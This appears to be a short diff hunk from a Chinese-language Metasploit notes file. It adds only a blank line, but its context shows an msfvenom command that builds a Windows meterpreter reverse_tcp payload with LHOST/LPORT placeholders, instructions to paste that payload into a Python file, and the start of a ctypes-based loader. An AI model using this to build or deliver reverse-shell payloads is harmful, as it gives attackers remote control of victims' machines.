@@ -132,7 +132,8 @@ db_autopwn –p –t –e
 利用msfvenom生成恶意荷载：（新版msf中msfvenom替代了msfpayload和msfencode）  
 msfvenom -p windows/meterpreter/reverse_tcp LPORT=(自定义) LHOST=(自定义) -f py >输出路径  
 1.将生成的恶意荷载代码放入下面代码中  
-2.替换下面代码的“恶意荷载”然后保存为.py格式  
+2.替换下面代码的“恶意荷载”然后保存为.py格式
+ 
 ```
 from ctypes import *
 import ctypes
